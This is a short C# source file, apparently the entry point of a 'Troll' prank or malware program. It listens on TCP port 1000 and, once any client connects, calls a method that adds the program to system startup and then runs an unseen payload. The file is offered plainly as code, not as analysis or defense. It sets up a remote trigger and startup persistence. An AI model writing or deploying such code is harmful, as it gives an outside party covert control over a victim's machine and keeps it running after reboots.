using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;

namespace Troll
{
    class Program
    {
        static void Main(string[] args)
        {
            TcpListener l = new TcpListener(1000);
            l.Start();
            l.AcceptTcpClient();
            Troll.AddToStartup();
            Troll.Run();
        }
    }
}
